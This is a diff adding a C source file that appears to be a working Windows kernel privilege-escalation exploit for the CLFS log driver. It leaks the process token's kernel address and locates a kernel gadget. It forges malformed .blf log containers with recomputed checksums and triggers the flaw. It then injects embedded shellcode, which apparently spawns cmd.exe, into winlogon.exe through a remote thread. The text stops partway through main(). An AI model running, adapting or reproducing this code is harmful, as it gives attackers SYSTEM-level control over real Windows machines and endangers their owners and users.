@@ -1,0 +1,756 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include "head.h"
+
+
+DWORD64 GetModuleAddr(const char* modName)
+{
+	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
+
+	DWORD outBuffer = 0;
+	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
+
+	if (status == ((NTSTATUS)0xC0000004L))//STATUS_INFO_LENGTH_MISMATCH
+	{
+		free(buffer);
+		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
+		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
+	}
+
+	if (!buffer)
+	{
+		printf("[-] NtQuerySystemInformation error\n");
+		return 0;
+	}
+
+	for (unsigned int i = 0; i < buffer->NumberOfModules; i++)
+	{
+		PVOID kernelImageBase = buffer->Modules[i].ImageBase;
+		PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
+		if (_stricmp(kernelImage, modName) == 0)
+		{
+			free(buffer);
+			return (DWORD64)kernelImageBase;
+		}
+	}
+	free(buffer);
+	return 0;
+}
+
+
+DWORD64 LeakEporcessKtoken()
+{
+
+	LPVOID drivers[1024] = {};
+	DWORD cbNeeded = NULL;
+	ntoskrnlBase = NULL;
+	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
+	{
+		if (drivers[0])
+		{
+			ntoskrnlBase = drivers[0];
+			printf("[-] ntoskrnlBase=%p\n", ntoskrnlBase);
+		}
+	}
+	else
+	{
+		printf("[-] EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
+	}
+
+	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
+	if (!proc)
+	{
+		printf("[-] OpenProcess failed\n");
+		return 0;
+	}
+
+	HANDLE token = 0;
+	if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
+	{
+		printf("[-] OpenProcessToken failed\n");
+		return 0;
+	}
+
+	DWORD64 ktoken = 0;
+	for (int i = 0; i < 0x100; i++)
+	{
+		ktoken = GetKernelPointer(token, 0x5);
+
+		if (ktoken != NULL)
+		{
+			break;
+		}
+
+	}
+	return ktoken;
+}
+
+
+DWORD64 GetGadgetAddr(const char* name)
+{
+	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
+	HMODULE mod = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+	if (!mod)
+	{
+		printf("[-] leaking ntoskrnl version\n");
+		return 0;
+	}
+	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
+	DWORD64 returnValue = base + offset - (DWORD64)mod;
+	//printf("[+] FunAddr: %p\n", (DWORD64)returnValue);
+	FreeLibrary(mod);
+	return returnValue;
+}
+
+DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
+{
+	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
+
+	DWORD outBuffer = 0;
+	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
+
+	if (status == (NTSTATUS)0xC0000004L)
+	{
+		free(buffer);
+		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
+		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
+	}
+
+	if (!buffer)
+	{
+		printf("[-] NtQuerySystemInformation error \n");
+		return 0;
+	}
+
+	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
+	{
+		DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;
+
+		if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
+		{
+			if (handle == (HANDLE)buffer->Handles[i].HandleValue)
+			{
+				DWORD64 object = (DWORD64)buffer->Handles[i].Object;
+				free(buffer);
+				return object;
+			}
+		}
+	}
+	printf("[-] handle not found\n");
+	free(buffer);
+	return 0;
+}
+
+
+
+BOOL InitFuncAddr()
+{
+	/*
+	NtQuerySystemInformationFunc NtQuerySystemInformation = 0;
+
+	NtSetInformationThreadFunc NtSetInformationThread = 0;
+
+	RtlInitUnicodeStringFunc RtlInitUnicodeString = 0;
+
+	NtCreateFileFunc NtCreateFile = 0;
+	*/
+	RtlInitUnicodeString = 0;
+	NtCreateFile = 0;
+	HMODULE nt = GetModuleHandleA("ntdll.dll");
+	if (!nt)
+	{
+		printf("Get nt module fail\r\n");
+		return FALSE;
+	}
+	RtlInitUnicodeString = (RtlInitUnicodeStringFunc)GetProcAddress(nt, "RtlInitUnicodeString");
+	NtCreateFile = (NtCreateFileFunc)GetProcAddress(nt, "NtCreateFile");
+	NtSetInformationThread = (NtSetInformationThreadFunc)GetProcAddress(nt, "NtSetInformationThread");
+	NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(nt, "NtQuerySystemInformation");
+	if (!NtCreateFile || !RtlInitUnicodeString || !NtSetInformationThread || !NtQuerySystemInformation)
+	{
+		printf("Get function address fail\r\n");
+		return FALSE;
+	}
+	printf("RtlInitUnicodeString = %p\tNtCreateFile = %p\tNtSetInformationThread = %p\tNtQuerySystemInformation = %p\r\n", RtlInitUnicodeString, NtCreateFile, NtSetInformationThread, NtQuerySystemInformation);
+	return TRUE;
+}
+
+
+
+
+DWORD initData1(DWORD dwNum1, DWORD dwNum2)
+{
+	DWORD dwRet = 0;
+	DWORD i = 1;
+	DWORD dwNumTemp = dwNum1;
+	while (i <= dwNum2)
+	{
+		if ((dwNumTemp & 1) != 0)
+		{
+			dwRet |= 1 << (dwNum2 - i);
+		}
+		dwNumTemp >>= 1;
+		++i;
+	}
+	return dwRet;
+}
+
+DWORD initData()
+{
+	for (int i = 0; i < 0x100; i++)
+	{
+		BYTE bt = 8;
+		DWORD dwData = initData1(i, bt) << 24;   //80
+		//printf("%08X\t", dwData);
+		DWORD dwDataTemp = dwData;
+		for (int j = 8; j > 0; --j)
+		{
+			dwDataTemp = dwData << 1;
+			dwData = ~(dwData >> 0x1F) + 1;
+			dwData &= 0x4C11DB7;
+			dwData = dwDataTemp ^ dwData;
+		}
+		BYTE bt1 = 32;
+		//printf("%08X\r\n", dwData);
+		DWORD rt1 = initData1(dwData, bt1);
+		datas[i] = rt1;
+	}
+	return 0;
+}
+
+
+
+
+ULONG64 getTempPathStr(PULONG64 buffer)
+{
+	Sleep(0);
+	if (!buffer)
+	{
+		printf("Allocation CLFS_PATHES failed\r\n");
+		return 0;
+	}
+	memset(buffer, 0, 0x1040);
+	GetTempPathW(0x104, (LPWSTR)buffer);
+	wcscpy((wchar_t*)((ULONG64)buffer + 0x208), (wchar_t*)buffer);
+	GetTempFileNameW((LPCWSTR)buffer, L"wct", 0, (LPWSTR)((ULONG64)buffer + 0x208));
+	if (!DeleteFileW((LPWSTR)((ULONG64)buffer + 0x208)) && GetLastError() != 2)
+	{
+		printf("cant generate unique blf filename\r\n");
+		return 0;
+	}
+	wcscpy((wchar_t*)((ULONG64)buffer + 0x410), L"\\??\\");
+	wcscat((wchar_t*)((ULONG64)buffer + 0x410), (wchar_t*)((ULONG64)buffer + 0x208));
+
+	wcscpy((wchar_t*)((ULONG64)buffer + 0x618), L"\\GLOBAL??\\LOG:");
+	wcscat((wchar_t*)((ULONG64)buffer + 0x618), (wchar_t*)((ULONG64)buffer + 0x410));
+
+	wcscpy((wchar_t*)((ULONG64)buffer + 0x820), (wchar_t*)((ULONG64)buffer + 0x208));
+	wcscat((wchar_t*)((ULONG64)buffer + 0x820), L".blf");
+
+	wcscpy((wchar_t*)((ULONG64)buffer + 0xA28), (wchar_t*)((ULONG64)buffer + 0x410));
+	wcscat((wchar_t*)((ULONG64)buffer + 0xA28), L".blf");
+	if (DeleteFileW((LPWSTR)((ULONG64)buffer + 0x820)) || GetLastError() == 2)
+	{
+		GetTempFileNameW((LPWSTR)buffer, L"wct", 0, (LPWSTR)((ULONG64)buffer + 0xC30));
+		wcscpy((wchar_t*)((ULONG64)buffer + 0xE38), L"\\??\\");
+		wcscat((wchar_t*)((ULONG64)buffer + 0xE38), (wchar_t*)((ULONG64)buffer + 0xC30));
+		if (DeleteFileW((LPWSTR)((ULONG64)buffer + 0xC30)) || GetLastError() == 2)
+		{
+			return 1;
+		}
+		else
+		{
+			printf("cant generate unique container filename\r\n");
+			return 0;
+		}
+	}
+	else
+	{
+		printf("cant generate unique blf filename\r\n");
+		return 0;
+	}
+	Sleep(0);
+
+}
+
+
+ULONG64 CreateControlRecord(DWORD dwSize, DWORD arg1, DWORD arg2, __out PULONG64 ControlRecord)
+{
+	Sleep(0);
+	PVOID lpCtrlRecord = malloc(dwSize);
+	if (lpCtrlRecord)
+	{
+		memset(lpCtrlRecord, 0, dwSize);
+		*(WORD*)lpCtrlRecord = 0x15;
+		*(WORD*)((ULONG64)lpCtrlRecord + 2) = 0x1;
+		*(WORD*)((ULONG64)lpCtrlRecord + 4) = dwSize >> 9;
+		*(WORD*)((ULONG64)lpCtrlRecord + 6) = dwSize >> 9;
+		*(WORD*)((ULONG64)lpCtrlRecord + 0x28) = 0x70;
+		*(WORD*)((ULONG64)lpCtrlRecord + 0x68) = (dwSize - 2 * (dwSize >> 9)) & 0xFFF8;
+		*(ULONG64*)((ULONG64)lpCtrlRecord + 0x78) = 0xC1F5C1F500005F1C;// CLFS_CONTROL_RECORD_MAGIC_VALUE 
+		*(ULONG64*)((ULONG64)lpCtrlRecord + 0xB8) = 0x6;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0xC8) = dwSize;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0xE0) = dwSize;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0xE4) = dwSize;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0xE8) = 1;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0xF8) = arg1;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0xFC) = 2 * dwSize;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x100) = 2;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x110) = arg1;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x114) = arg1 + 2 * dwSize;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x118) = 3;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x128) = arg2;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x12C) = 2 * dwSize + 2 * arg1;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x130) = 4;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x140) = arg2;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x144) = arg2 + 2 * arg1 + 2 * dwSize;
+		*(DWORD*)((ULONG64)lpCtrlRecord + 0x148) = 5;
+		*ControlRecord = (ULONG64)lpCtrlRecord;
+		return  1;
+	}
+	printf("Allocation fail\r\n");
+	return 0;
+}
+
+ULONG64 encodeBlock1(PULONG64 lpBuffer, DWORD arg1, DWORD arg2, DWORD ndNum)
+{
+	char v6;
+	char v7;
+	if (!*(WORD*)((ULONG64)lpBuffer + 4))
+		return 0xC01A000A;
+	if (*(unsigned __int16*)((ULONG64)lpBuffer + 6) < (int)*(unsigned __int16*)((ULONG64)lpBuffer + 4))
+		return 0xC01A000Ai64;
+	if (*(unsigned __int16*)((ULONG64)lpBuffer + 4) << 9 > arg1)
+		return 0xC01A000A;
+	if (ndNum > 0x10u)
+		return 0xC000000D;                       // STATUS_INVALID_PARAMETER
+	if ((arg2 & 0x11) == 0)
+		return 0xC000000D;
+	if ((*(DWORD*)((ULONG64)lpBuffer + 16) & 1) != 0)
+		return 0xC01A000A;
+	if ((*(DWORD*)((ULONG64)lpBuffer + 104) & 7) != 0)
+		return 0xC01A000A;
+	if (*(DWORD*)((ULONG64)lpBuffer + 104) + 2 * (arg1 >> 9) > arg1)
+		return 0xC01A000A;
+	for (int i = 0; i < arg1 >> 9; ++i)
+	{
+		*(WORD*)(*(unsigned int*)((ULONG64)lpBuffer + 104) + (ULONG64)lpBuffer) = *(WORD*)((ULONG64)lpBuffer + (i << 9) + 510);
+		if (i)
+			v6 = 0;
+		else
+			v6 = 64;
+		if ((arg1 >> 9) - 1 == i)
+			v7 = 32;
+		else
+			v7 = 0;
+		*(WORD*)((ULONG64)lpBuffer + (i << 9) + 510) = (unsigned __int8)(v7 | v6 | ndNum) | (arg2 << 8);
+	}
+	*(DWORD*)((ULONG64)lpBuffer + 16) = *(DWORD*)((ULONG64)lpBuffer + 16) & 0xFFFFFFFC | 1;
+
+	return 0;
+}
+
+ULONG64 encodeBlock2(PULONG64 lpBuffer, DWORD dwNum)
+{
+	unsigned int v3 = -1;
+	for (int i = 0; i < dwNum; ++i)
+	{
+		v3 = datas[*(unsigned __int8*)((ULONG64)lpBuffer + i) ^ (unsigned __int8)v3] ^ (v3 >> 8);
+	}
+	return ~v3;
+}
+
+ULONG64 setCheckSum(PULONG64 lpBuf, DWORD ndNum)
+{
+	*(DWORD*)((ULONG64)lpBuf + 0xC) = 0;
+	if (encodeBlock1(lpBuf, *(unsigned __int16*)((ULONG64)lpBuf + 4) << 9, *(BYTE*)((ULONG64)lpBuf + 2), ndNum) >= 0)
+	{
+		*(DWORD*)((ULONG64)lpBuf + 12) = encodeBlock2(lpBuf, *(unsigned __int16*)((ULONG64)lpBuf + 4) << 9);
+		return 1;
+	}
+	printf("Failed to encode block\r\n");
+	return 0;
+}
+
+ULONG64 createAttackerContainer(PULONG64 lpPathBuffer, DWORD dwSize)
+{
+	Sleep(4);
+	PVOID lpAttackerContainer = malloc(dwSize);
+	memset(lpAttackerContainer, 0, dwSize);
+	*(WORD*)lpAttackerContainer = 0x15;
+	*(WORD*)((ULONG64)lpAttackerContainer + 2) = 1;
+	*(WORD*)((ULONG64)lpAttackerContainer + 3) = dwSize >> 9;           // 80000 >> 9 = 400
+	*(WORD*)((ULONG64)lpAttackerContainer + 6) = dwSize >> 9;           // 400
+	*(ULONG64*)((ULONG64)lpAttackerContainer + 6) = 0x70;
+	*(WORD*)((ULONG64)lpAttackerContainer + 0x28) = 0x70;
+	*(WORD*)((ULONG64)lpAttackerContainer + 0x68) = (dwSize - 2 * (dwSize >> 9)) & 0xFFF8;// F800
+	*(BYTE*)lpAttackerContainer = 0x15;
+	*(BYTE*)((ULONG64)lpAttackerContainer + 4) = 1;
+	*(WORD*)((ULONG64)lpAttackerContainer + 4) = 1;
+	*(WORD*)((ULONG64)lpAttackerContainer + 6) = 1;
+	*(WORD*)((ULONG64)lpAttackerContainer + 0x68) = 0x1F8;
+	setCheckSum((PULONG64)lpAttackerContainer, 0x10);
+	// \??\C:\Users\test\AppData\Local\Temp\wct7E7A.tmp
+	HANDLE hFile = CreateFileW((LPCWSTR)((ULONG64)lpPathBuffer + 0xE38), 0x10000000u, 0, 0, 1, 0x80u, 0);
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		printf("CreateFileW failed: %d\n", GetLastError());
+		return 0;
+	}
+	DWORD NumberOfBytesWritten = 0;
+	if (WriteFile(hFile, lpAttackerContainer, dwSize, &NumberOfBytesWritten, 0) || NumberOfBytesWritten == dwSize)
+	{
+		CloseHandle(hFile);
+		return 1;
+	}
+	printf("WriteFile failed: %d\n", GetLastError());
+	return 0;
+}
+
+ULONG64 CreateBaseLogRecord(PULONG64 lpPathBuffer, DWORD dwSize, DWORD arg3, PVOID fakeContainer, PULONG64 lpRet)
+{
+	Sleep(1);
+	PVOID lpBuf = malloc(dwSize);
+	if (lpBuf)
+	{
+		memset(lpBuf, 0, dwSize);
+		*(WORD*)lpBuf = 0x15;
+		*(WORD*)((ULONG64)lpBuf + 2) = 1;
+		*(WORD*)((ULONG64)lpBuf + 4) = dwSize >> 9;
+		*(WORD*)((ULONG64)lpBuf + 6) = dwSize >> 9;
+		*(WORD*)((ULONG64)lpBuf + 0x28) = 0x70;
+		*(WORD*)((ULONG64)lpBuf + 104) = (dwSize - 2 * (dwSize >> 9)) & 0xFFF8;
+		*(DWORD*)((ULONG64)lpBuf + 0xC8) = 0x1800;
+		*(DWORD*)((ULONG64)lpBuf + 5028) = 2;
+		*(DWORD*)((ULONG64)lpBuf + 0x1A8) = 0x2B5;
+		*(DWORD*)((ULONG64)lpBuf + 0x1AC) = 0x1830;
+		*(DWORD*)((ULONG64)lpBuf + 0x1B0) = 0x1A30;
+		*(DWORD*)((ULONG64)lpBuf + 0x19C) = 1;
+		*(DWORD*)((ULONG64)lpBuf + 0x39C) = 0x13A0;
+		*(DWORD*)((ULONG64)lpBuf + 0x13E0) = 0xC1FDF006;
+		*(DWORD*)((ULONG64)lpBuf + 0x13E4) = 0x30;
+		*(DWORD*)((ULONG64)lpBuf + 0x13E8) = 0;
+		*(DWORD*)((ULONG64)lpBuf + 0x13EC) = 0xB8;
+		*(DWORD*)((ULONG64)lpBuf + 0x1400) = 0x13F0;
+		*(DWORD*)((ULONG64)lpBuf + 0x1404) = 0x13A0;
+		*(DWORD*)((ULONG64)lpBuf + 0x1410) = 0xC1FDF007;
+		*(DWORD*)((ULONG64)lpBuf + 0x1414) = 0x88;
+		*(ULONG64*)((ULONG64)lpBuf + 0x1418) = arg3;
+		*(BYTE*)((ULONG64)lpBuf + 5152) = 1;
+		*(BYTE*)((ULONG64)lpBuf + 0x1421) = 0;
+		*(WORD*)((ULONG64)lpBuf + 0x1422) = 0;
+		*(WORD*)((ULONG64)lpBuf + 0x1434) = 1;
+		*(ULONG64*)((ULONG64)lpBuf + 0x1448) = 0;
+		// \??\C:\Users\test\AppData\Local\Temp\wct7E7A.tmp
+		wcscpy((wchar_t*)((ULONG64)lpBuf + 0x1460), (wchar_t*)((ULONG64)lpPathBuffer + 0xE38));
+		*(DWORD*)((ULONG64)lpBuf + 0x319) = 0x2B5;
+		*(BYTE*)((ULONG64)lpBuf + 0x32D) = 0;
+		*(ULONG64*)((ULONG64)lpBuf + 0x35D) = 0x80000;
+		*(DWORD*)((ULONG64)lpBuf + 6264) = 0x58A84;
+		*(DWORD*)((ULONG64)lpBuf + 0x187C) = 0xB8;
+		*(DWORD*)((ULONG64)lpBuf + 0x1890) = 0x1900;
+		*(DWORD*)((ULONG64)lpBuf + 0x1894) = 0x1830;
+		*(BYTE*)((ULONG64)lpBuf + 0x18A8) = 1;
+		wcscpy((wchar_t*)((ULONG64)lpBuf + 0x1970), L"test");
+		*(DWORD*)((ULONG64)lpBuf + 0x1A90) = 0x1C00;
+		*(DWORD*)((ULONG64)lpBuf + 0x1A94) = 0x1A30;
+		*(BYTE*)((ULONG64)lpBuf + 6824) = 2;
+		wcscpy((wchar_t*)((ULONG64)lpBuf + 0x1C70), L"test1");
+		*(DWORD*)((ULONG64)lpBuf + 0x1C04) = 7072;
+		*(BYTE*)((ULONG64)lpBuf + 0x1C20) = 1;
+		*(ULONG64*)((ULONG64)lpBuf + 0x1C28) = (ULONG64)fakeContainer;
+		*lpRet = (ULONG64)lpBuf;
+
+		return 1;
+	}
+	printf("Allocation failed\r\n");
+	return 0;
+}
+
+ULONG64 CreateTruncateRecord(DWORD arg2, PULONG64 lpRet)
+{
+	Sleep(3);
+	PVOID lpTruncateRecord = malloc(arg2);
+	if (lpTruncateRecord)
+	{
+		memset(lpTruncateRecord, 0, arg2);
+		*(WORD*)lpTruncateRecord = 0x15;
+		*(WORD*)((ULONG64)lpTruncateRecord + 0x2) = 1;
+		*(WORD*)((ULONG64)lpTruncateRecord + 0x4) = arg2 >> 9;
+		*(WORD*)((ULONG64)lpTruncateRecord + 0x6) = arg2 >> 9;
+		*(WORD*)((ULONG64)lpTruncateRecord + 0x28) = 0x70;
+		*(WORD*)((ULONG64)lpTruncateRecord + 0x68) = (arg2 - 2 * (arg2 >> 9)) & 0xFFF8;
+		*lpRet = (ULONG64)lpTruncateRecord;
+		return 1;
+	}
+	printf("Allocation failed\r\n");
+	return 0;
+}
+
+ULONG64 createFakeContainer(PULONG64 lpPathBuffer, PVOID fakeContainer)
+{
+	// C:\Users\test\AppData\Local\Temp\wct7E79.tmp.blf
+	HANDLE hFile = CreateFileW((LPCWSTR)((ULONG64)lpPathBuffer + 0x820), 0x40000000, 0, 0, 2, 0x80, 0);
+
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		printf("Create File fail : %d\r\n", GetLastError());
+		return 0;
+	}
+	DWORD dwSize = 0x400;
+	DWORD arg1 = 0x2000;
+	DWORD arg2 = 0x4000;
+	DWORD arg3 = 0x80000;
+	ULONG64 CtrlRecord = 0;
+	// 构建_CLFS_CONTROL_RECORD
+	if (!CreateControlRecord(dwSize, arg1, arg2, &CtrlRecord))
+	{
+		printf("Create control record failed\r\n");
+		return 0;
+	}
+	printf("Get control record is  %08X\r\n", CtrlRecord);
+	PVOID lpBuf = malloc(2 * dwSize);
+	memset(lpBuf, 0, 2 * dwSize);
+	memcpy(lpBuf, (PVOID)CtrlRecord, 0x400);
+	Sleep(0);
+	setCheckSum((PULONG64)lpBuf, 0x10);
+	DWORD NumberOfBytesWritten = 0;
+	if (!WriteFile(hFile, lpBuf, 2 * dwSize, &NumberOfBytesWritten, 0) && NumberOfBytesWritten != 2 * dwSize)
+	{
+		printf("WriteFile failed : %d\r\n", GetLastError());
+		return 0;
+	}
+
+	if (!createAttackerContainer(lpPathBuffer, arg3))
+	{
+		printf("Create attacker container failed\r\n");
+		return 0;
+	}
+
+	ULONG64 lpRetBaseLogRecord = 0;
+	if (!CreateBaseLogRecord(lpPathBuffer, arg1, arg3, fakeContainer, &lpRetBaseLogRecord))
+	{
+		printf("Create baselog record failed\r\n");
+		return 0;
+	}
+	printf("Get Base log record address is %p\r\n", lpRetBaseLogRecord);
+	PVOID lpRecoedTemp = malloc(2 * arg1);
+	memset(lpRecoedTemp, 0, 2 * arg1);
+	memcpy(lpRecoedTemp, (PVOID)lpRetBaseLogRecord, arg1);
+	setCheckSum((PULONG64)lpRecoedTemp, 0x10);
+	if (!WriteFile(hFile, lpRecoedTemp, 2 * arg1, &NumberOfBytesWritten, 0) && NumberOfBytesWritten != 2 * arg1)
+	{
+		printf("WriteFile failed - %x", GetLastError());
+		return 0;
+	}
+	ULONG64 lpRetTruncateRecord = 0;
+	if (!CreateTruncateRecord(arg2, &lpRetTruncateRecord))
+	{
+		printf("Create truncate record failed\r\n");
+		return 0;
+	}
+	printf("Get truncate record is  %08X\r\n", lpRetTruncateRecord);
+	PVOID lpTruncateRecoedTemp = malloc(2 * arg2);
+	memset(lpTruncateRecoedTemp, 0, 2 * arg2);
+	memcpy(lpTruncateRecoedTemp, (PVOID)lpRetTruncateRecord, arg2);
+	setCheckSum((PULONG64)lpTruncateRecoedTemp, 0x10);
+	if (!WriteFile(hFile, lpTruncateRecoedTemp, 2 * arg2, &NumberOfBytesWritten, 0) && NumberOfBytesWritten != 2 * arg2)
+	{
+		printf("WriteFile failed - %x", GetLastError());
+		return 0;
+	}
+	CloseHandle(hFile);
+	return 1;
+}
+
+
+void triggerPoc(PVOID container)
+{
+	IO_STATUS_BLOCK IoStatusBlock;
+	PULONG64 lpBuffer = (PULONG64)malloc(0x1040);
+	// 构建路径结构，这里可以构建为结构体
+	if (getTempPathStr(lpBuffer))
+	{
+		// 创建虚假的Container
+		if (createFakeContainer(lpBuffer, container))// create container for trigger
+		{
+			HANDLE hObject = 0;
+			OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(OBJECT_ATTRIBUTES) };
+			UNICODE_STRING DestinationString;
+			// \GLOBAL??\LOG:\??\C:\Users\test\AppData\Local\Temp\wct7E79.tmp
+			RtlInitUnicodeString(&DestinationString, (PCWSTR)((ULONG64)lpBuffer + 0x618));
+			ObjectAttributes.Length = 48;
+			ObjectAttributes.RootDirectory = 0;
+			ObjectAttributes.Attributes = 0;
+			ObjectAttributes.ObjectName = &DestinationString;
+			ObjectAttributes.SecurityDescriptor = 0;
+			ObjectAttributes.SecurityQualityOfService = 0;
+			NTSTATUS status = NtCreateFile(&hObject, 0xC0000000, &ObjectAttributes, &IoStatusBlock, 0, 0, 0, 1, 0, 0, 0);
+			if (status >= 0)
+			{
+				OBJECT_ATTRIBUTES ObjectAttributes1 = { sizeof(OBJECT_ATTRIBUTES) };
+				UNICODE_STRING unicodeStr;
+				RtlInitUnicodeString(&unicodeStr, L"test");
+				ObjectAttributes1.Length = 48;
+				ObjectAttributes1.RootDirectory = hObject;
+				ObjectAttributes1.Attributes = 0;
+				ObjectAttributes1.ObjectName = &unicodeStr;
+				ObjectAttributes1.SecurityDescriptor = 0;
+				ObjectAttributes1.SecurityQualityOfService = 0;
+				HANDLE hFile = INVALID_HANDLE_VALUE;
+				status = NtCreateFile(&hFile, 0x80010000, &ObjectAttributes1, &IoStatusBlock, 0, 0, 0, 1, 0, 0, 0);
+				if (status >= 0)
+				{
+					FILE_DISPOSITION_INFO fdi = { 1 };
+					if (SetFileInformationByHandle(hFile, FileDispositionInfo, (LPVOID)&fdi, 1))
+					{
+						CloseHandle(hFile);
+						CloseHandle(hObject);
+					}
+				}
+			}
+
+		}
+	}
+
+	return;
+}
+
+
+
+void InjectToWinlogon()
+{
+	unsigned char shellcode[] =
+		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
+		"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
+		"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
+		"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
+		"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
+		"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
+		"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
+		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
+		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
+		"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
+		"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
+		"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
+		"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
+		"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
+		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
+		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
+		"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
+		"\x78\x65\x00";
+
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	int pid = -1;
+	if (Process32First(snapshot, &entry))
+	{
+		while (Process32Next(snapshot, &entry))
+		{
+			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
+			{
+				pid = entry.th32ProcessID;
+				break;
+			}
+		}
+	}
+
+	CloseHandle(snapshot);
+
+	if (pid < 0)
+	{
+		printf("Could not find process\n");
+		return;
+	}
+
+	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	if (!h)
+	{
+		printf("Could not open process: %x", GetLastError());
+		return;
+	}
+
+	void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!buffer)
+	{
+		printf("[-] VirtualAllocEx failed\n");
+	}
+
+	if (!buffer)
+	{
+		printf("[-] remote allocation failed");
+		return;
+	}
+
+	if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
+	{
+		printf("[-] WriteProcessMemory failed");
+		return;
+	}
+
+	HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
+
+	if (hthread == INVALID_HANDLE_VALUE)
+	{
+		printf("[-] CreateRemoteThread failed");
+		return;
+	}
+}
+
+
+
+int main()
+{
+	// 获取函数
+	if (!InitFuncAddr())
+	{
+		printf("FAIL\r\n");
+		getchar;
+		return 0;
+	}
+	// 初始化checksum 计算使用的数据
+	initData();
+	PVOID pContainer = malloc(0xE0);
+	if (pContainer)
+	{
+
+		ULONG64 ktoken = LeakEporcessKtoken();
+
+		printf("[-] ktoken addr =%p\n", ktoken);
+
+		ULONG64 GadgetAddr = GetGadgetAddr("RtlSetAllBits");
+
+		printf("[-] GadgetAddr addr =%p\n", GadgetAddr);
+
+
+		memset(pContainer, 0xCC, 0xE0);
+		printf("malloc addr = %p\r\n", pContainer);
+
+
+		PVOID pExpFuncAddeInKrnl = VirtualAllocEx((HANDLE)-1, (LPVOID)0x0000027300000000, 0x100, MEM_RESERVE, PAGE_READWRITE);
